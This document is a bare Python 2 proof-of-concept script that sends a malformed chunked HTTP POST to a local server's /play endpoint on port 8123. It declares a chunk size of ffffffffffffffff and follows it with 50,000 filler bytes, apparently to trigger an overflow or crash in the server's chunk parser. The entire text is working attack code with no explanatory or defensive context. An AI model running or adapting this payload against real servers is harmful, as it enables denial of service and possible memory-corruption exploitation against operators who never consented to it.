#!/usr/bin/env python2

from socket import *

host='localhost'
port=8123

sock=socket(AF_INET,SOCK_STREAM)
sock.connect((host,port))
sock.settimeout(5)

s='POST /play HTTP/1.1\r\n'
s+='Host: %s\r\n' % host
s+='Content-type: multipart/form-data\r\n'
s+='Transfer-encoding: chunked\r\n'
s+='\r\n'
s+='ffffffffffffffff'
s+='\r\n'
s+='X'*50000
sock.sendall(s)

try:
    print sock.recv(10000)
except:
    print 'response timeout'

sock.close()
